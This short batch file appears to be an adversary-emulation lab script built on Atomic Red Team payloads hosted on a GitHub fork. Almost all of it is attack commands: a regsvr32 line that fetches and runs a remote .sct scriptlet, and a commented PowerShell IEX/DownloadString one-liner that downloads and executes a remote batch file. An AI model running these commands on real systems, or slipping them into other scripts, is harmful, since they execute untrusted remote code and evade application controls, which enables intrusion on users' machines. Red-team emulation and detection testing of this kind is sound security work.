:: Basic Test Lab One
:: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/Windows/Payloads/RegSvr32.sct
::

regsvr32.exe /s /u /i:https://raw.githubusercontent.com/cvt111/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll
...
::    https://raw.githubusercontent.com/cvt111/atomic-red-team/master/Windows/Payloads/Discovery.bat
::	  Alternate Endings ;-) => powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cvt111/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')"
